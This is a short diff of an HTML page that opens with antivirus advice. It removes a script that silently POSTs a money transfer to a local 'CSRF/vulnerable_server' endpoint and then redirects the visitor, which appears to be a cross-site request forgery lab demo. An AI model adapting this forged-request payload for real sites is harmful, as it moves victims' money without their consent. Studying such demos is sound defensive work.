@@ -54,15 +54,3 @@ With cyber attacks on the rise, it’s more important than ever to install antiv
     <iframe name="my_frame" style="display:none;"></iframe>
     </div>
 </div>
-<script>
-    function transferandredirect(){
-        $.ajax({
-            type: "POST",
-            url: "http://localhost:8080/CSRF/vulnerable_server/transfermoney.php",
-            data: "destination+address=0001&amount=1",
-            success: function(){
-                window.location="espn.com";
-            }
-        })
-    }
-</script>
